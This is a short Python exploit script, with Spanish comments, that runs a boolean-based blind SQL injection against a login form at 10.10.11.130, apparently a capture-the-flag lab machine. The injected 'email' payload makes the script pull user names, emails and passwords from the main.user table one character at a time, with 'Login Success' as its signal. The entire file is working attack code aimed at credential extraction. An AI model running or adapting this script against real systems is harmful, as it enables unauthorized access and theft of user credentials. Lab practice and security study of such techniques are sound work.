#!/usr/bin/python3

from pwn import *
import requests, signal, sys, string

# Variables globales
url = "http://10.10.11.130/login"
header = {"Content-Type": "application/x-www-form-urlencoded"}

numbers = string.digits
letters = string.ascii_lowercase
simbols = r"-_:@!$%&()*+/;<=>?[\]^{|}.~"
dictionary = numbers + letters + simbols

result = ""

def def_handler(sig, frame):
    print("\n[+] Saliendo...")
    exit(1)

# Ctrl + C
signal.signal(signal.SIGINT, def_handler)

def makeRequest(payload):
    data_post = {
            'email':'%s' % payload, 
            'password':'xdann1'
            }
    r = requests.post(url, data=data_post, headers=header)
    return r


if __name__ == "__main__":
    p2 = log.progress("Iniciando proceso de fuerza bruta")
    p1 = log.progress("Output: ")
    for n in range(0, 10):
        for i in range(1, 60):
            for c in dictionary:
                payload = "a' or SUBSTR((select concat(name,':',email,':',password) from main.user limit %d,1),%d,1)='%s'-- -" % (n, i, c)
                r = makeRequest(payload)

                p2.status("Probando en el resultado %d con el caracter %s en la posicion %d" % (n, c, i))

                if "Login Success" in r.text:
                    result += c
                    p1.status(result)
                    c = "_"

        result += " "
